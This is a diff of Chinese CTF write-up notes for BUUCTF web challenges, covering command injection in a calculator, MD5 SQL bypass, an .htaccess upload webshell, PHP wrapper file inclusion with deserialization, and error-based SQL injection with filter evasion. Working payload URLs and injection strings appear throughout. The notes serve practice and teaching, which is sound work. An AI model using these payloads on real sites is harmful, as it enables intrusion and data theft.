@@ -120,8 +120,7 @@ else {
 }
 ```
 将字符串视作int时，数就是字符串开头的数字。‘123’，直接key=123拿到flag
-[RoarCTF 2019]Easy Calc
-#命令执行漏洞 
+[RoarCTF 2019]Easy Calc #命令执行漏洞 
 查看源码中的script部分以及有WAF的提示：
 ```php
 #<!--I've set up WAF to ensure security.-->
@@ -187,8 +186,7 @@ var_dump(get_file_contents())
 ```http://node4.buuoj.cn:25481/calc.php? num=1;var_dump(get_file_contents(chr(47).f1agg))```
 chr(47).f1agg，即：/f1agg
 取得flag.
-[BJDCTF2020]Easy MD5
-#md5绕过
+[BJDCTF2020]Easy MD5 #md5绕过
 进入只有一个提交框，在请求头看到hint:
 `Hint: select * from 'admin' where password=md5($pass,true)`
 要用万能钥匙，‘or 1=1’，其会被MD5，要求某个MD5串直接转为字符串后的结果是or \[1-9]才可以。
@@ -246,8 +244,7 @@ echo md5("046eec27-a62c-4a05-b12a-bc7cc476b8b4".$scookie)
 修改session
 Unicode欺骗
 题有问题，没有源码
-[MRCTF2020]你传你🐎呢
-#命令执行漏洞 
+[MRCTF2020]你传你🐎呢 #命令执行漏洞 
 直接上传图片马，妄图修改后缀不可行，其同时过滤了文件后缀以及MIME,上传.htaccess，将名为shit的文件视为php执行：
 ```
 <FilesMatch "shit" >
@@ -270,8 +267,7 @@ var_dump(file('/flag'))
 ?>
 ```
 第一次上传后发现根目录有/flag.第二次拿到flag
-[ZJCTF 2019]NiZhuanSiWei
-#Include文件包含漏洞
+[ZJCTF 2019]NiZhuanSiWei #Include文件包含漏洞
 进入，查看源码：
 ```php
 <?php  
@@ -376,9 +372,16 @@ echo serialize($a);
 `[a01eea38-1c9d-4973-9169-67357bdd35c5.node4.buuoj.cn:81/?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}](http://a01eea38-1c9d-4973-9169-67357bdd35c5.node4.buuoj.cn:81/?text=data://text/plain,welcome%20to%20the%20zjctf&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;})`
 查看源码，拿到flag。
 关于===php伪协议===：[[【精选】文件包含支持的伪协议_data伪协议-CSDN博客.pdf]]
-
+[极客大挑战 2019]HardSQL #SQL注入漏洞 
+直接使用单引号，报错，可以注入
+再使用万能钥匙，显示“臭弟弟，你可别被我逮住了”，说明某些字符被屏蔽了。
+用单引号搭配其他sql语句进行测试，发现空格，=，by，union被屏蔽掉了
+空格被屏蔽使用()来构造语句(一定要注意括号范围以及关系)
+等号被屏蔽使用like替代
+by,union被屏蔽则使用报错注入（updatexml,extractvalue等，使用方法一致）。
+先获取数据库名：
 `1'or(updatexml(1,concat(0x7e,database()),1))#`
-
+再获取表名：
 `1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))),1))#`
 
 `1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),1))#
